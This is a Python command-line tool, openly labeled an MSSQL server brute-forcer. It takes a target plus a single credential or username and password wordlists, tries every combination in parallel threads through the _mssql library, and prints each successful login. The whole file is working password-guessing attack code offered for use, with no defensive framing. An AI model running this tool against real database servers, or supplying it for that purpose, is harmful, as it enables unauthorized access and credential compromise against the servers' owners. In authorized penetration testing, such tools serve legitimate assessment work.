#!/usr/bin/env python
from __future__ import print_function

import argparse
from multiprocessing.dummy import Pool
import warnings

with warnings.catch_warnings():
    warnings.filterwarnings("ignore",category=DeprecationWarning)
    import _mssql

BUFFER_SIZE = 5*1024
TIMEOUT = 5

def brute_force(server,username,password):
    try:
        _mssql.login_timeout = TIMEOUT
        mssql = _mssql.connect(server=server, user=username, password=password)
        print("[+] Successful login: "+username+":"+password+"@"+server)
    except _mssql.MSSQLDatabaseException as e:
        print("[-] Login failed")

def brute_main(data):
    _data = data.split(':')
    server = _data[0]
    username = _data[1]
    password = _data[2]
    try:
        _mssql.login_timeout = TIMEOUT
        mssql = _mssql.connect(server=server, user=username, password=password)
        print("[+] Successful login: "+username+":"+password+"@"+server)
    except _mssql.MSSQLDatabaseException as e:
        print("[-] Login failed: "+username+":"+password+"@"+server)

def mutil_brute( _data_list : list,threadNum):
    pool = Pool(int(threadNum))
    pool.map_async(brute_main, _data_list)
    pool.close()
    pool.join()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(add_help=True, description="MSSQL server brute force.")
    parser.add_argument('target', action='store', help='targetName or address')
    parser.add_argument('-u','-username', action='store', help='username')
    parser.add_argument('-p','-password', action='store', help='password')
    
    parser.add_argument('-user-list', action='store', help='List of username')
    parser.add_argument('-pass-list', action='store', help='List of password')
    parser.add_argument('-t','-thread', action='store', help='Thread num')

    options = parser.parse_args()
    
    if options.pass_list == None:
        brute_force(options.target, options.u, options.p)
    
    else:
        username_list = open(options.user_list).read().splitlines()
        password_list = open(options.pass_list).read().splitlines()
        run_list = []
        for user in username_list:
            for _pass in password_list:
                run_list.append(f"{options.target}:{user}:{_pass}")
        mutil_brute(run_list,options.t)